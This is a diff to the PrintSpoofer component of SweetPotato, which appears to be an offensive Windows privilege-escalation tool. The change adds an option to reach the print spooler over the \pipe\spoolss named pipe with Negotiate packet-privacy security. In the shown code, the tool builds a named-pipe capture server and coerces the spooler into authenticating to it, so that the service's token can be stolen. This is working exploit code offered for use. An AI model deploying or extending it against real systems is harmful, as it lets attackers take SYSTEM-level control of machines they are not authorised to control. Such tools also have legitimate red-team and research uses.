@@ -1,13 +1,8 @@
-﻿using NtApiDotNet.Ndr.Marshal;
-using NtApiDotNet.Win32;
-using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
+﻿using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
 using System;
-using System.Collections.Generic;
 using System.IO.Pipes;
-using System.Linq;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
+using NtApiDotNet.Win32.Rpc.Transport;
 
 namespace SweetPotato {
     internal class PrintSpoofer {
@@ -59,13 +54,25 @@ namespace SweetPotato {
             spoolPipeThread.Start();
         }
 
-        public void TriggerPrintSpoofer() {
+        public void TriggerPrintSpoofer(RpcTransport rpcTransport) {
 
             string captureServer = string.Format($"\\\\{hostName}/pipe/{pipeName}");
             string printerHost = string.Format($"\\\\{hostName}");
 
             Client c = new Client();
-            c.Connect();
+
+            if (rpcTransport == RpcTransport.ncacn_np)
+            {
+                RpcTransportSecurity trsec = new RpcTransportSecurity();
+                trsec.AuthenticationLevel = RpcAuthenticationLevel.PacketPrivacy;
+                trsec.AuthenticationType = RpcAuthenticationType.Negotiate;
+
+                c.Connect("ncacn_np", "\\pipe\\spoolss", "localhost", trsec);
+            }
+            else
+            {
+                c.Connect();
+            }
 
             Struct_0 devModeContainer = new Struct_0();
 
